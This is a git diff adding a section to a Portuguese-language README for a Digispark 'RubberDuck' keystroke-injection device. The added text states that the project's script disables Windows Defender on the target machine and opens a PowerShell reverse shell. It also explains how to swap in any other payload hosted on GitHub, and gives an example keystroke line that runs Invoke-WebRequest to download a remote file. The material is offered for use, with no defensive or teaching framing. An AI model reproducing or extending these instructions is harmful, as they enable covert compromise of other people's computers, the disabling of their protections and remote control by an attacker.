@@ -36,3 +36,12 @@ Após tudo isso, sempre coloque esses dois include no começo do seu script:
 ### Baixe o DigiKeyboardPtBr aqui:
     https://github.com/cosmosredshiftsete/RubberDuck_Digispark/blob/main/DigiKeyboardPtBr.h
 (caso você baixe o repositório, ele ja virá.)
+
+
+
+### Sobre o Script:
+Esse script do repositório faz o RubberDuck desativar o windows defender da maquina e executar uma Reverse Shell via Powershell.
+Recomendo você seguir a mesma logíca do script do RubberDuck. Caso queira subir um script diferente na maquina, você deve subir um repositório no GitHub com seu script, colocar o link do seu repoitório na linha 49, que ele irá executar seu script baixando via powershell.
+#### Exemplo:
+          DigiKeyboardPtBr.println("Invoke-WebRequest -Uri 'link do seu repositório aqui' -OutFile 'nome_arquivo.aqui'");
+        
